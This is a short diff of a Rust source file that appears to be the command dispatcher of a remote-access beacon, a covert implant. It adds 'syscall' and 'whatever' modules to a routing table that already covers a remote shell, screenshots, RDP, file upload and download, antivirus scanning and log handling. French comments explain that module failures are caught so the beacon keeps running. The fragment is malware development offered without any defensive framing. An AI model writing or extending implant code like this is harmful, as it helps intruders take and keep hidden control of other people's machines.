@@ -13,8 +13,13 @@ pub mod rdp;
 pub mod screenshot;
 pub mod shell;
 pub mod shell_builtin;
+pub mod syscall;
 pub mod transfer;
+pub mod whatever;
 
+/// Aiguillage commande → module.
+/// Un module qui panique ou échoue renvoie une ligne d'erreur :
+/// le beacon ne tombe jamais à cause d'une capacité.
 pub fn dispatch(command: &str, args: &str) -> String {
     let result = std::panic::catch_unwind(|| run_module(command, args));
     match result {
@@ -42,6 +47,8 @@ fn run_module(command: &str, args: &str) -> String {
         "detect"               => detect::run(args),
         "avscan"               => avscan::run(args),
         "logroll"              => logroll::run(args),
+        "whatever"             => whatever::run(args),
+        "syscall"              => syscall::run(args),
         "download"             => transfer::download(args),
         "upload"               => transfer::upload(args),
         "run"                  => run_script(args),
